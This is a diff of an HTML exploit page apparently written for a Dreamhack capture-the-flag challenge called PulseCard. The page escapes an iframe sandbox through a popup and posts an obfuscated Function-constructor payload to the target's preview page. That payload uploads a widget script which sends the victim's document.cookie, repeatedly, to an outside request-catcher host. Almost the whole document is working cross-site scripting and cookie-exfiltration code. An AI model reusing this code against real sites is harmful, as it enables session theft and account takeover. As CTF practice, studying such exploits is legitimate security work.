@@ -2,22 +2,27 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PulseCard Exploit Final Debug</title>
+  <title>PulseCard top-level exploit</title>
 </head>
 <body>
-  <h1>PulseCard exploitt</h1>
+  <h1>PulseCard exploit</h1>
 
-  <iframe id="box" sandbox="allow-scripts" style="display:none"></iframe>
+  <iframe
+    id="sender"
+    sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"
+    style="display:none">
+  </iframe>
 
   <script>
-  const CALLBACK = "https://aptounc.request.dreamhack.games";
+  const CALLBACK = "https://ypvpgjy.request.dreamhack.games";
 
   new Image().src = CALLBACK + "/loaded?t=" + Date.now();
 
   const widgetJS = `
     (() => {
       const C = ${JSON.stringify(CALLBACK)};
-      const send = (path, data) => {
+
+      function send(path, data) {
         const u = C + path + "?d=" + encodeURIComponent(data) + "&t=" + Date.now();
 
         try {
@@ -28,43 +33,42 @@
         } catch (e) {}
 
         try {
-          fetch(u + "&m=fetch", {
-            mode: "no-cors",
-            keepalive: true
-          }).catch(() => {});
+          fetch(u + "&m=fetch", { mode: "no-cors", keepalive: true }).catch(() => {});
         } catch (e) {}
 
         try {
           navigator.sendBeacon(u + "&m=beacon");
         } catch (e) {}
-      };
-
-      send("/widget-loaded", location.href);
-
-      let c = "";
-      try {
-        c = document.cookie || "";
-      } catch (e) {
-        c = "cookie-error:" + String(e);
       }
 
-      send("/cookie", c);
+      send("/widget-loaded", location.href);
+      send("/cookie", document.cookie || "EMPTY");
 
       let n = 0;
-      const timer = setInterval(() => {
+      setInterval(() => {
         n++;
-        send("/cookie-repeat-" + n, document.cookie || "");
-        if (n >= 8) clearInterval(timer);
+        send("/cookie-repeat-" + n, document.cookie || "EMPTY");
       }, 500);
     })();
   `;
 
-  const stage2 =
-    `(async()=>{try{` +
-    `let r=await fetch('/export',{method:'POST',credentials:'include',headers:{'X-Card-Token':CARD_TOKEN,'Content-Type':'application/javascript'},body:${JSON.stringify(widgetJS)}});` +
-    `let x=await r.text();` +
-    `top.postMessage({t:'stage',s:r.status,x:x},'*');` +
-    `}catch(e){top.postMessage({t:'err',x:String(e)},'*')}})()`;
+  const stage2 = `
+    (async () => {
+      const r = await fetch("/export", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "X-Card-Token": CARD_TOKEN,
+          "Content-Type": "application/javascript"
+        },
+        body: ${JSON.stringify(widgetJS)}
+      });
+
+      const name = await r.text();
+
+      location.href = "/review?widget=" + encodeURIComponent(name);
+    })();
+  `;
 
   const pctAll = s =>
     Array.from(new TextEncoder().encode(s), b =>
@@ -74,48 +78,41 @@
   const formula =
     `Date["con"+"structor"](decodeURIComponent(${JSON.stringify(pctAll(stage2))}))()`;
 
-  window.addEventListener("message", e => {
-    const d = e.data || {};
-
-    new Image().src =
-      CALLBACK +
-      "/msg?d=" +
-      encodeURIComponent(JSON.stringify(d).slice(0, 1500)) +
-      "&t=" +
-      Date.now();
-
-    if (d.t === "stage" && d.s === 200 && /^[A-Za-z0-9_-]+\.js$/.test(d.x)) {
-      const target =
-        "http://localhost:5000/review?widget=" + encodeURIComponent(d.x);
-
-      new Image().src =
-        CALLBACK +
-        "/nav?to=" +
-        encodeURIComponent(target) +
-        "&t=" +
-        Date.now();
-
-      setTimeout(() => {
-        location.replace(target);
-      }, 500);
-    }
-  });
-
   const inner = `
 <!doctype html>
 <html>
 <body>
-  <iframe id="p" src="http://localhost:5000/preview"></iframe>
-  <script>
-    const payload = ${JSON.stringify(formula)};
-    setInterval(() => {
-      frames[0].postMessage(payload, "*");
-    }, 300);
-  <\/script>
-</body>
-</html>`;
+<script>
+  const CALLBACK = ${JSON.stringify(CALLBACK)};
+  const payload = ${JSON.stringify(formula)};
 
-  document.getElementById("box").srcdoc = inner;
+  new Image().src = CALLBACK + "/sender-start?t=" + Date.now();
+
+  let w = null;
+
+  function go() {
+    try {
+      if (!w || w.closed) {
+        w = window.open("http://localhost:5000/preview", "pulsecard_preview");
+        new Image().src = CALLBACK + "/popup-opened?ok=" + String(!!w) + "&t=" + Date.now();
+      }
+
+      if (w) {
+        w.postMessage(payload, "*");
+        new Image().src = CALLBACK + "/posted?t=" + Date.now();
+      }
+    } catch (e) {
+      new Image().src = CALLBACK + "/sender-error?e=" + encodeURIComponent(String(e)) + "&t=" + Date.now();
+    }
+  }
+
+  setInterval(go, 500);
+<\/script>
+</body>
+</html>
+  `;
+
+  document.getElementById("sender").srcdoc = inner;
   </script>
 </body>
 </html>
